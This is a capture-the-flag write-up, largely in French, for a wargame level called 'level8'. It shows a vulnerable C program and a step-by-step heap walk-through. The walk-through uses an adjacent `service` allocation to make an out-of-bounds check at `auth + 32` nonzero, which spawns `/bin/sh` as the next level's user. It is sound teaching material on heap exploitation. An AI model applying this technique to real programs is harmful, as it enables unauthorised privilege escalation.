# level8

    char *auth;
    char *service;

    int main(void) {
        char buf[128];

        while (1) {
            printf("%p, %p \n", auth, service);
            if (fgets(buf, 128, stdin) == NULL)
                return 0;

            if (!strncmp(buf, "auth ", 5)) {
                auth = malloc(4);
                memset(auth, 0, 4);
                if (strlen(buf + 5) < 31)       
                    strcpy(auth, buf + 5);       
            }
            if (!strncmp(buf, "reset", 5))
                free(auth);

            if (!strncmp(buf, "service", 6))
                service = strdup(buf + 7);

            if (!strncmp(buf, "login", 5)) {
                if (*(int *)(auth + 32) == 0)
                    puts("Password:");
                else
                    system("/bin/sh");
            }
        }
    }


Le check final (`login`) regarde `*(auth + 32)` 32 octets après le début d'un bloc que `malloc(4)` n'a réservé que sur... 4 octets. Le reste (jusqu'à l'octet 32 et au-delà) n'appartient pas vraiment à `auth`, c'est juste de la mémoire adjacente sur le tas. Si on arrive à y placer un octet non-nul, le check passe et `system("/bin/sh")` s'exécute

Il y a aussi un souci directement dans `auth` (elle vérifie la taille du texte source avant le `strcpy`, mais jamais la taille réelle de sa destination 4 octets), mais la solution ci-dessous n'en a pas besoin : elle passe par `service`, dont le `strdup` n'a lui carrément aucune limite.

**Step by step, avec les adresses en hexa**

    ./level8

**1. Démarrage.** `auth` et `service` sont encore des pointeurs globaux jamais initialisés → nuls :

    (nil), (nil)

**2. On tape `auth`.** `malloc(4)` réserve un bloc à `0x0804a008`, mis à zéro par `memset` :

    auth
    0x804a008, (nil)

Contenu du tas à ce moment (chaque ligne = 4 octets) :

    adresse        contenu
    0x0804a008     00 00 00 00     <- auth[0..3], nos 4 octets réservés
    0x0804a00c     .. .. .. ..     <- pas encore alloué

**3. On tape `service0123456789abcdef` puis Entrée.** Le programme reconnaît le préfixe `service`, puis fait `strdup(buf + 7)`. Important : `fgets` (contrairement à `gets`) **garde le `\n`** du retour à la ligne dans le buffer donc la vraie chaîne dupliquée n'est pas `"0123456789abcdef"` (16 caractères) mais `"0123456789abcdef\n"` (17 caractères), suivie du `\0` que `strdup` ajoute lui-même. Ce nouveau bloc est placé **juste après** celui de `auth` sur le tas (même principe d'allocations consécutives que les levels précédents) :

    service0123456789abcdef
    0x804a008, 0x804a018

Contenu du tas maintenant:

    adresse        contenu           texte
    0x0804a008     00 00 00 00                    <- auth[0..3]
    0x0804a00c     .. .. .. ..                     <- fin du chunk auth (padding)
    0x0804a010     .. .. .. ..                     <- en-tête du chunk service (prev_size)
    0x0804a014     .. .. .. ..                     <- en-tête du chunk service (size)
    0x0804a018     30 31 32 33       "0123"        <- début de la chaîne copiée par strdup
    0x0804a01c     34 35 36 37       "4567"
    0x0804a020     38 39 61 62       "89ab"
    0x0804a024     63 64 65 66       "cdef"
    0x0804a028     0a 00 00 00       "\n\0.."       <- le \n capturé par fgets, puis le \0 de strdup

(8 lignes de 4 octets, sans en sauter aucune, entre `0x0804a008` et `0x0804a028` = 32 octets = `0x20`, cohérent avec `auth + 0x20`.)

**4. Le calcul qui fait tout marcher :** le check regarde `*(int *)(auth + 32)`. En hexa, `32` décimal = `0x20`, donc :

    auth + 0x20  =  0x0804a008 + 0x20  =  0x0804a028

Cette adresse tombe pile sur l'octet juste après nos 16 caractères c'est-à-dire le **`\n`** que `fgets` a capturé quand on a appuyé sur Entrée (`0x0a` en ASCII), pas un `\0`. Le check lit 4 octets d'un coup (`0x0a 0x00 0x00 0x00`) comme un entier, ce qui donne `10` en décimal non-nul, donc `system("/bin/sh")` se déclenche.

**5. On tape `login`.** Le programme relit `*(auth + 0x20)`, le trouve non-nul, et lance `system("/bin/sh")` :

    login
    $ whoami
    level9
